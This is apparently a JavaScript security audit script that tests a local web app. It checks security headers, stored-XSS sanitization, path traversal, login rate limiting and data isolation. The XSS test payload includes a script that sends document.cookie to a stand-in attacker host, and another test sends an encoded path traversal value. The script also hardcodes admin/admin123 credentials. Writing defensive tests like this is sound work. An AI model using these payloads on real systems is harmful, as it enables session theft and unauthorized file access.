const NEXT_URL = "http://localhost:3000";
const BACKEND_URL = "http://localhost:5000";

let failures = 0;
function assert(condition, message) {
  if (condition) {
    console.log(`  ✓ ${message}`);
  } else {
    console.error(`  ✗ FAIL: ${message}`);
    failures++;
  }
}

async function runSecurityAudit() {
  console.log("=== COMPREHENSIVE APPLICATION SECURITY AUDIT ===");

  // 1. Content Security Policy & Security Headers (Frontend)
  console.log("\n[1] Testing CSP & Hardened Headers on Next.js...");
  try {
    const res = await fetch(`${NEXT_URL}/`);
    assert(res.ok, `GET / returned ${res.status}`);
    const csp = res.headers.get("content-security-policy");
    assert(!!csp, "Content-Security-Policy header is present");
    assert(csp.includes("default-src 'self'"), "CSP contains default-src 'self'");
    assert(csp.includes("object-src 'none'"), "CSP restricts object-src 'none'");
    assert(csp.includes("base-uri 'self'"), "CSP restricts base-uri 'self'");
    assert(res.headers.get("x-frame-options") === "SAMEORIGIN", "X-Frame-Options: SAMEORIGIN");
    assert(res.headers.get("x-content-type-options") === "nosniff", "X-Content-Type-Options: nosniff");
  } catch (err) {
    assert(false, `CSP check failed: ${err.message}`);
  }

  // 2. Stored XSS Input Sanitization (Backend /api/enquiries)
  console.log("\n[2] Testing Stored XSS Protection in Contact Form...");
  try {
    const maliciousPayload = {
      name: "Attacker <script>alert('xss-name')</script>",
      email: "attacker@security-test.com",
      phone: "+1 555-0199 <iframe src='evil.com'></iframe>",
      category: "Freelance Work <img src=x onerror=alert(1)>",
      message: "Hello <script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>World!",
    };

    const submitRes = await fetch(`${BACKEND_URL}/api/enquiries`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(maliciousPayload),
    });

    assert(submitRes.status === 201, `Submission status: ${submitRes.status}`);
    const data = await submitRes.json();
    assert(!data.enquiry.name.includes("<script>"), "Name stripped of <script> tag");
    assert(!data.enquiry.phone.includes("<iframe"), "Phone stripped of <iframe> tag");
    assert(!data.enquiry.message.includes("<script>"), "Message stripped of malicious script injection");
    assert(!data.enquiry.category.includes("<img"), "Category stripped of malicious HTML");
  } catch (err) {
    assert(false, `XSS sanitization check failed: ${err.message}`);
  }

  // 3. Path Traversal Protection (Backend /api/media/:filename)
  console.log("\n[3] Testing Path Traversal Attack Prevention...");
  try {
    // Get valid admin token
    const loginRes = await fetch(`${BACKEND_URL}/api/auth/login`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ username: "admin", password: "admin123" }),
    });
    const { token } = await loginRes.json();

    // Attempt path traversal deletion
    const traversalRes = await fetch(`${BACKEND_URL}/api/media/..%2F..%2Fdata%2Fdb.json`, {
      method: "DELETE",
      headers: { Authorization: `Bearer ${token}` },
    });

    // Expect 404 (safe basename) or 403 (resolved path check)
    assert(traversalRes.status === 404 || traversalRes.status === 403, `Path traversal was blocked (HTTP ${traversalRes.status})`);
  } catch (err) {
    assert(false, `Path traversal check failed: ${err.message}`);
  }

  // 4. Rate Limiting on Authentication (Brute-Force Protection)
  console.log("\n[4] Testing Brute-Force Rate Limiting on /api/auth/login...");
  try {
    let hitRateLimit = false;
    let attempts = 0;
    // Attempt up to 14 rapid requests (limit is set to 10 per 15 mins)
    for (let i = 0; i < 14; i++) {
      attempts++;
      const res = await fetch(`${BACKEND_URL}/api/auth/login`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username: "admin", password: "wrong_password_test" }),
      });
      if (res.status === 429) {
        hitRateLimit = true;
        const body = await res.json();
        assert(true, `Rate limit triggered at attempt ${attempts}: "${body.error}"`);
        assert(res.headers.has("retry-after"), "Retry-After header sent by rate limiter");
        break;
      }
    }
    assert(hitRateLimit, "Brute force rate limiter successfully engaged with HTTP 429");
  } catch (err) {
    assert(false, `Rate limiting test failed: ${err.message}`);
  }

  // 5. Data Isolation (Privacy Check)
  console.log("\n[5] Testing Public Content Data Isolation (/api/content)...");
  try {
    const contentRes = await fetch(`${BACKEND_URL}/api/content`);
    const content = await contentRes.json();
    assert(content.admin === undefined, "admin object is strictly omitted from public response");
    assert(content.enquiries === undefined, "enquiries array is strictly omitted from public response");
  } catch (err) {
    assert(false, `Data isolation test failed: ${err.message}`);
  }

  console.log("\n=======================================================");
  if (failures === 0) {
    console.log("✅ ALL APPLICATION SECURITY AUDIT CHECKS PASSED!");
  } else {
    console.error(`❌ ${failures} SECURITY CHECKS FAILED.`);
  }
  console.log("=======================================================");
}

runSecurityAudit();
